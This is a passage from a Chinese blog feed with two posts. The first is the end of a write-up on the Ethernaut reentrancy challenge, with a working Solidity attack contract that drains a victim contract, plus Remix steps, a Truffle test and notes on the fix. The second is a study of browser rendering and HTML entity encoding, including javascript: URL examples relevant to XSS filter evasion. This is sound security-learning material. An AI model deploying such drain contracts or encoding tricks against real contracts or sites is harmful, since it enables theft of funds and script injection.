src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1opdicj309w065q2v.jpg" alt="cr1.png"></p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1w4vonj30e304k743.jpg" alt="cr2.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fuud21cja7j30a0060743.jpg" alt="cr3.png"></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud24vl1oj30g8046wea.jpg" alt="cr4.png"></p><p>number为重入次数，instance为受害者合约地址，另一个是攻击合约地址</p><p>完全不知道原因，感觉原理也很底层，也就不深究了。<br>贴上攻击代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//引入目标合约内容</span></span><br><span class="line"> contract Reentrance &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//.... 和上文一模一样的内容 ....</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自己的攻击合约</span></span><br><span class="line">contract MyContract &#123;</span><br><span class="line">    <span class="comment">//目标合约实例</span></span><br><span class="line">    Reentrance c;</span><br><span class="line">    <span class="comment">//合约拥有者</span></span><br><span class="line">    address owner;</span><br><span class="line">    <span class="comment">//进入payable fallback函数的次数</span></span><br><span class="line">    uint public number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyContract</span>(<span class="params">address _c</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">//链接至目标合约</span></span><br><span class="line">        c = Reentrance(_c);</span><br><span class="line">        <span class="comment">//确认合约所有者，用于最后取钱</span></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        <span class="comment">//直接完成donate步骤，在创建合约时，给一些钱</span></span><br><span class="line">        c.donate.value(msg.value)(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//payable fallback 函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">//计数</span></span><br><span class="line">        number++;</span><br><span class="line">        <span class="comment">//不一定是donate金额的倍数，榨干每一点钱</span></span><br><span class="line">        uint weHave = c.balanceOf(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">if</span> (weHave &gt; c.balance) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c.balance != <span class="number">0</span>) c.withdraw(c.balance);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        c.withdraw(weHave);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//调用withdraw，需要两次以上的调用，目前不知道原因</span></span><br><span class="line">    <span class="comment">//此处参数可以为0。但是不意味着可以不donate。一次性转钱的最大值就是donate的金额</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        c.withdraw(<span class="number">0</span>);</span><br><span class="line">        c.withdraw(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//提取参数至合约拥有者</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getmoney</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">      owner.transfer(<span class="keyword">this</span>.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用Remix的操作步骤</p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2btqddj30aa0660ss.jpg" alt="cr6.png"></p><p>创建合约</p><ul><li>前者填写创建合约时，附加的金额，用于donate。</li><li>后者填写目标合约address</li></ul><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fuud2g147zj30a6059t8n.jpg" alt="cr7.png"></p><p>攻击 -&gt; 拿钱</p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud2k3e27j311w0hwjuc.jpg" alt="cr5.png"></p><p>提交</p><h2 id="基于truffle-本地测试"><a href="#基于truffle-本地测试" class="headerlink" title="基于truffle 本地测试"></a>基于truffle 本地测试</h2><p>下面是利用 <code>truffle</code> + <code>ganache</code> 利用 <code>truffle test</code> 进行本地测试的代码。没有遇到Remix环境下的坑，不知道是链的问题，还是编译器的问题。记录一下过程。</p><p>设置部署文件 <code>2_deploy_contracts.js</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Victim = artifacts.require(<span class="string">'./Victim.sol'</span>)</span><br><span class="line"><span class="keyword">const</span> Attacker = artifacts.require(<span class="string">'./Attacker.sol'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  deployer</span><br><span class="line">    .deploy(Victim)</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span></span><br><span class="line">      deployer.deploy(Attacker, Victim.address)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>链接至ganache测试链，<code>truffle.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// See &lt;http://truffleframework.com/docs/advanced/configuration&gt;</span></span><br><span class="line">  <span class="comment">// to customize your Truffle configuration!</span></span><br><span class="line">  networks: &#123;</span><br><span class="line">    development: &#123;</span><br><span class="line">      <span class="comment">// host: "10.21.238.12",</span></span><br><span class="line">      <span class="comment">// port: 8545,</span></span><br><span class="line">      host: <span class="string">'localhost'</span>,</span><br><span class="line">      port: <span class="number">7545</span>,</span><br><span class="line">      network_id: <span class="string">"*"</span> <span class="comment">// Match any network id</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>test.js</code>基于js的测试脚本：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> attacker = artifacts.require(<span class="string">"Attacker"</span>);</span><br><span class="line"><span class="keyword">const</span> victim = artifacts.require(<span class="string">"Victim"</span>);</span><br><span class="line"></span><br><span class="line">contract(<span class="string">'test'</span>, <span class="keyword">async</span> (accounts) =&gt; &#123;</span><br><span class="line">    it(<span class="string">"should put 10 in attacker"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        acct1 = accounts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: attacker.address, <span class="attr">value</span>: <span class="number">20</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> result= <span class="keyword">await</span> instance_att.donate.sendTransaction(options)</span><br><span class="line">        <span class="comment">// console.log(result);</span></span><br><span class="line">        <span class="built_in">console</span>.log(getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(attacker.address), <span class="number">20</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">     it(<span class="string">"should put 100 in victim"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance = <span class="keyword">await</span> victim.deployed();</span><br><span class="line">        acct1 = accounts[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> options = &#123; <span class="attr">from</span>: acct1, <span class="attr">to</span>: victim.address, <span class="attr">value</span>: <span class="number">100</span> &#125;</span><br><span class="line">        <span class="keyword">let</span> result= web3.eth.sendTransaction(options)</span><br><span class="line">        <span class="comment">// console.log(result);</span></span><br><span class="line">        <span class="built_in">console</span>.log(getBalance(victim.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">100</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">    <span class="comment">//  it("show attacker and victim", async () =&gt; &#123;</span></span><br><span class="line">    <span class="comment">//     let getBalance = web3.eth.getBalance;</span></span><br><span class="line">    <span class="comment">//     console.log(getBalance(victim.address))</span></span><br><span class="line">    <span class="comment">//     console.log(getBalance(attacker.address))</span></span><br><span class="line">    <span class="comment">//     assert.equal(getBalance(victim.address), 100);</span></span><br><span class="line">    <span class="comment">//  &#125;),</span></span><br><span class="line">     it(<span class="string">"attack_ready (transfer 10)"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</span><br><span class="line">        <span class="built_in">console</span>.log(attacker.address)</span><br><span class="line">        <span class="built_in">console</span>.log(accounts[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.transfer.sendTransaction(victim.address,<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">110</span>);</span><br><span class="line">     &#125;),</span><br><span class="line">     it(<span class="string">"attack (get 20)"</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> instance_att = <span class="keyword">await</span> attacker.deployed();</span><br><span class="line">        <span class="keyword">let</span> instance_vic = <span class="keyword">await</span> victim.deployed();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> getBalance = web3.eth.getBalance;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> instance_att.attack()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> result2 = <span class="keyword">await</span> instance_vic.balanceOf.call(attacker.address,&#123;<span class="attr">from</span>: attacker.address&#125;)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack in vic:"</span>+result2)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfvictim:"</span>+getBalance(victim.address))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"balanceOfAttack:"</span>+getBalance(attacker.address))</span><br><span class="line">        assert.equal(getBalance(victim.address), <span class="number">90</span>);</span><br><span class="line">     &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud2rkcqtj30fn09qdga.jpg" alt="cr8.png"></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>重入漏洞形成原因：</p><ul><li>使用<code>call.value</code>转账，会发送全部Gas，为重入循环转账提供了条件</li><li>资产记录的改变，在实际转账后。漏洞的关键点。</li></ul><p>重入漏洞修补：</p><ul><li>资产记录的改变，在实际转账前。</li><li>不使用<code>call.value</code>，使用<code>transfer</code></li><li>使用安全的加减函数，捕获溢出，形成回滚。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2" target="_blank" rel="noopener">https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2</a><br><a href="https://bbs.pediy.com/thread-228422.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228422.htm</a><br><a href="https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/" target="_blank" rel="noopener">https://blog.riskivy.com/%e6%99%ba%e8%83%bd%e5%90%88%e7%ba%a6ctf%ef%bc%9aethernaut-writeup-part-2/</a><br><a href="https://www.secpulse.com/archives/73682.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/73682.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 有意思，填一小块坑 —&lt;/p&gt;
    
    </summary>
    
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="solidity" scheme="http://lalajun.com/tags/solidity/"/>
    
      <category term="智能合约安全" scheme="http://lalajun.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>浏览器渲染原理与编码解码</title>
    <link href="http://lalajun.com/2018/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/"/>
    <id>http://lalajun.com/2018/08/25/浏览器渲染原理与编码解码/</id>
    <published>2018-08-25T09:05:28.000Z</published>
    <updated>2019-04-07T03:50:19.594Z</updated>
    
    <content type="html"><![CDATA[<p>— 被怼番之后，好好学习基础原理 —</p><a id="more"></a><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>突然被电话面试了一波，在XSS这里被怼番了…是真滴菜还一直没有补，哎，潜心研究一下。</p><p>其中有问到浏览器渲染的原理，可以说是没有了解了。可能平常会使用到更相近的是在想办法过滤的时候，需要了解的渲染中URL,HTML,JS编码解码过程。</p><p>这两块内容有着千丝万缕，放在一起学习，记录。</p><hr><h1 id="编码方便回顾小节"><a href="#编码方便回顾小节" class="headerlink" title="编码方便回顾小节"></a>编码方便回顾小节</h1><p>HTMl编码不能对标签（包括标签头 以及其中的属性，结构等），但是可以编码标签之间的内容，以及标签属性””之间的所有内容。可以编码javascript，可以编码alert，可以编码:等符号<br>URL编码不能对伪协议类型进行任何的编码操作：javascript:<br>js编码可以编码alert等标识符，不能编码控制字符<code>(</code>,<code>)</code>,<code>;</code>,<code>&quot;</code>,<code>&#39;</code>等</p><h1 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h1><p>看一个我觉得易于理解的webkit渲染主要流程：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult61719nj30hc081754.jpg" alt="s3.png"></p><p>加上js的作用如下：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult6vvff2j30jg06baae.jpg" alt="s6.jpg"></p><p><strong>名词解释：</strong></p><ul><li><strong>DOM Tree</strong>：浏览器将HTML解析成树形的数据结构</li><li><strong>CSS Rule Tree(CSSOM)</strong>：浏览器将CSS解析成树形的数据结构。</li><li><strong>Render Tree</strong>：DOM和CSSOM合并后生成Render Tree（渲染树）。渲染树用来计算可见元素的布局并且作为将像素渲染到屏幕上的过程的输入。</li><li><strong>layout</strong>：Webkit中元素的定位称为布局</li><li><strong>reflow</strong>：Gecko中称为回流，重新渲染，第一次渲染也叫这个</li><li><strong>repaint</strong>：重绘，不改变布局改变样式时重绘。比reflow快</li></ul><ul><li><strong>DOMContentLoaded</strong>：仅当DOM加载完成，不包括样式表，图片，flash，触发 DOMContentLoaded 事件</li><li><strong>onload事件</strong>：当页面上所有的DOM，样式表，脚本，图片，flash都已经加载完成了， 触发 onload 事件。</li></ul><ul><li><strong>首屏时间</strong>：当浏览器显示第一屏页面所消耗的时间，在国内的网络条件下，通常一个网站，如果“首屏时间”在2秒以内是比较优秀的，5秒以内用户可以接受，10秒以上就不可容忍了。</li><li><strong>白屏时间</strong>：指浏览器开始显示内容的时间。</li></ul><p>首先知道，以上的步骤不是严格一步步完成的。<br>渲染引擎会力求尽快将内容显示在屏幕上。它不必等到整个 HTML 文档解析完毕之后，就会开始构建render树和设置布局。在不断接收和处理来自网络的其余内容的同时，渲染引擎会将部分内容解析并显示出来。</p><p>以下来慢慢说几个重要的细节</p><h2 id="HTML-gt-DOM树"><a href="#HTML-gt-DOM树" class="headerlink" title="HTML -&gt; DOM树"></a>HTML -&gt; DOM树</h2><p><code>HTML解析器</code> 负责 HTML 变为 DOM树 的构建,地址可以分为<strong>标记化</strong>和<strong>树构建</strong>两个阶段</p><p>具体步骤如下：</p><ul><li>字节转化为字符</li><li>确定特定字符 tokens</li><li>将tokens 转化为 节点</li><li>以 Document 为根节点构建DOM树</li></ul><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult5nzvy2j30v70ha0ti.jpg" alt="s1.png"></p><blockquote><p>DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。 </p></blockquote><h3 id="css"><a href="#css" class="headerlink" title="css"></a>css</h3><p>在html文档的 head 中遇到了一个 link 标记，该标记引用一个外部css，浏览器会立即发出对该资源的请求</p><blockquote><p>由于 HTML解析构建和CSS的解析是相互独立的并不会造成冲突，因此我们通常将css样式放在head中，让浏览器尽早解析css。</p></blockquote><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>在html文档中 html解析器遇到一个script标记，他会阻塞DOM树的构建，开始下载js，然后将控制权移交给JavaScript引擎解析，执行。等 JavaScript 引擎运行完毕，浏览器会从中断的地方恢复 DOM 构建。</p><blockquote><p>因为js是可能会改变html现有结构，浏览器会在js执行后决定当前文档是否需要进行重新渲染或者重排，所以会堵塞。因此，js引用放在前面会推迟页面首绘时间。</p></blockquote><h2 id="CSS-gt-CSSOM树"><a href="#CSS-gt-CSSOM树" class="headerlink" title="CSS -&gt; CSSOM树"></a>CSS -&gt; CSSOM树</h2><p><strong>CSS解释器</strong>为页面上任何对象计算样式时，浏览器都会从适用于该节点的最通用规则开始（body元素子项，应用虽有body样式），然后规则“向下级联”，以递归的方式优化计算样式。</p><p>构建过程与html相似：</p><ul><li>字符 确定特定字符 tokens</li><li>将tokens 转化为 节点</li><li>构建cssom树</li></ul><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fult5wio0vj30t70e3dld.jpg" alt="s2.png"></p><blockquote><p>css解析过程，自右向左逆向解析。「div div p em」先匹配 em 开始。这样速度快<br>所以css层数嵌套越多，越慢</p></blockquote><h2 id="CSSOM-DOM-gt-render树"><a href="#CSSOM-DOM-gt-render树" class="headerlink" title="CSSOM + DOM -&gt; render树"></a>CSSOM + DOM -&gt; render树</h2><p>DOM 树与 CSSOM树 合并后形成 <strong>render（渲染）树</strong>。有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。</p><p><strong>生成过程</strong>：<br>遍历每个DOM树中的node节点，在CSSOM规则树中寻找当前节点的样式，生成渲染树。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult6fs4oij30vy0exjuc.jpg" alt="s4.png"></p><p>注意。不可见的DOM元素不会被插入渲染树。（head元素，disply值为none的隐藏DOM元素 不在渲染树中出现，visibility属性为hidden 的元素将出现在渲染树中）</p><h2 id="布局-loyout-reflow"><a href="#布局-loyout-reflow" class="headerlink" title="布局 loyout/reflow"></a>布局 loyout/reflow</h2><p>当渲染对象被创建并添加到树中，它们并没有位置和大小，计算这些值的过程称为<strong>layout</strong>或<strong>reflow</strong>。</p><p>Html使用基于流的布局模型，意味着大部分时间，可以以单一的途径进行几何计算。流中靠后的元素并不会影响前面元素的几何特性，所以布局可以在文档中从右向左、自上而下的进行。也存在一些例外，比如html tables。</p><p>布局是一个递归的过程，由根渲染对象开始，它对应html文档元素，布局继续递归的通过一些或所有的frame层级，为每个需要几何信息的渲染对象进行计算。</p><p>当 render tree 发生变化时则会重新layout、reflow</p><h3 id="全局、增量"><a href="#全局、增量" class="headerlink" title="全局、增量"></a>全局、增量</h3><p>layout、reflow也有不同的方式。<br>当layout在整棵渲染树触发时，称为<strong>全局layout</strong>。包括全局样式的改变，窗口resize等，窗口resize会马上进行reflow</p><p>有些操作浏览器并不会立刻reflow 或 repaint 一次，而是会把这样的操作积攒一批，然后做一次 reflow，这又叫异步 reflow 或增量异步 reflow</p><h2 id="绘制-Painting"><a href="#绘制-Painting" class="headerlink" title="绘制 Painting"></a>绘制 Painting</h2><p>绘制阶段，遍历渲染树并调用渲染对象的paint方法将它们的内容显示在屏幕上，绘制使用UI基础组件。</p><p>也分为全局绘制，与增量绘制一块矩形区域。<br>除此之外绘制还有特定的顺序，此处不多说。</p><hr><h1 id="渲染过程的解码过程"><a href="#渲染过程的解码过程" class="headerlink" title="渲染过程的解码过程"></a>渲染过程的解码过程</h1><h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p>给出一些常见的HTML实体编码，详细<a href="http://www.w3school.com.cn/tags/html_ref_ascii.asp" target="_blank" rel="noopener">ASCII常用参考</a>  <a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">ISO参考</a></p><table><thead><tr><th style="text-align:center">结果</th><th style="text-align:center">实体名称</th><th style="text-align:center">实体编码</th><th>16进制实体编码</th></tr></thead><tbody><tr><td style="text-align:center"><code>&quot;</code></td><td style="text-align:center"><code>&amp;quot;</code></td><td style="text-align:center"><code>&amp;#34;</code></td><td><code>&amp;#x22;</code></td></tr><tr><td style="text-align:center"><code>&#39;</code></td><td style="text-align:center"><code>&amp;apos;</code></td><td style="text-align:center"><code>&amp;#39;</code></td><td><code>&amp;#x27;</code></td></tr><tr><td style="text-align:center"><code>&amp;</code></td><td style="text-align:center"><code>&amp;amp;</code></td><td style="text-align:center"><code>&amp;#38;</code></td><td><code>&amp;#x26;</code></td></tr><tr><td style="text-align:center"><code>:</code></td><td style="text-align:center"></td><td style="text-align:center"><code>&amp;#58;</code></td><td><code>&amp;#x3A;</code></td></tr><tr><td style="text-align:center"><code>&lt;</code></td><td style="text-align:center"><code>&amp;lt;</code></td><td style="text-align:center"><code>&amp;#60;</code></td><td><code>&amp;#x3C;</code></td></tr><tr><td style="text-align:center"><code>=</code></td><td style="text-align:center"></td><td style="text-align:center"><code>&amp;#61;</code></td><td><code>&amp;#x3D;</code></td></tr><tr><td style="text-align:center"><code>&gt;</code></td><td style="text-align:center"><code>&amp;gt;</code></td><td style="text-align:center"><code>&amp;#62;</code></td><td><code>&amp;#x3E;</code></td></tr><tr><td style="text-align:center"><code>?</code></td><td style="text-align:center"></td><td style="text-align:center"><code>&amp;#63;</code></td><td><code>&amp;#x3F;</code></td></tr></tbody></table><p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。</p><p>只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。<br>但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code></p><p>并且不是所有节点内容都会进行实体解码，比如<code>&lt;script&gt;</code>里面的代码</p><p>以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。</p><p>对于标签属性进行html编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 源码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&amp;#<span class="attr">x3d</span>;"<span class="attr">123</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 渲染后右键源码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>&amp;#<span class="attr">x3d</span>;"<span class="attr">123</span>"&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fult724cztj309n04wwe9.jpg" alt="s7.png"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult6ov33uj30fx03p0sn.jpg" alt="s5.png"></p><p>点击后不会有跳转到<code>/123</code>页面，说明是不会解析的。标签本身也是同理。</p><p>对于标签内容进行html编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 源码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31;&amp;#x32;&amp;#x33;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 渲染后右键源码  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31;&amp;#x32;&amp;#x33;"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>虽然右键源码内容还是html编码的,但是实际可以跳转<br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fult7jzx45j30da03hglf.jpg" alt="s9.png"></p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fult7qap6nj309900zwe9.jpg" alt="s10.png"></p><p>可以换一种更清楚的方式来看结果。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"JavaScript:alert('&amp;#x3C;OK&amp;#x3E;')"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fult7thytpj30l204xdfr.jpg" alt="s11.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 测试时发现上面两种情况，不用; 作为编码结束，也可以识别 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x31&amp;#x32&amp;#x33"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img 